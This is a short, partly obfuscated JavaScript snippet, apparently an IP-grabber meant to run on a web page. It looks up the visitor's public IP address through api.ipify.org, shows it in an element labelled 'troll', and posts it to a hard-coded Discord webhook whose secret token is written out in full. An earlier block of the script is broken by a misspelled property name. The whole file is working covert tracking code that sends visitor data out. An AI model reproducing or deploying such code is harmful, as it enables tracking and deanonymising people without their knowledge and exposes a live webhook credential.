var Requester = new XMLHttpRequest()
Requester.open('GET', 'https://api.ipify.org', false)
Requester.send(null)
document.getElementById('troll').innerHTML = Requester.responseText
var data = new FormData()
data.append('content', Requester.reponseText)
Requester.open('POST', '', false)
Requester.send(data)
fetch('https://api.ipify.org/?format=json')
  .then((_0x25f868) => _0x25f868.json())
  .then((_0x13a086) => {
    const _0x2fbc9e = _0x13a086.ip
    document.getElementById('troll').innerHTML =
      'IPv4: ' + _0x2fbc9e
    const _0x1c3ad3 =
        'https://discord.com/api/webhooks/1230673184089440327/xxYOmaRr1PlwDR9MS1RZXFp01Jgf_IaxzawR4xiKHnptKVDusa4Anb7A6tr8l5O7lhKQ',
      _0x319b46 = 'IPv4: ' + _0x2fbc9e
    fetch(_0x1c3ad3, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: _0x319b46 }),
    })
  })
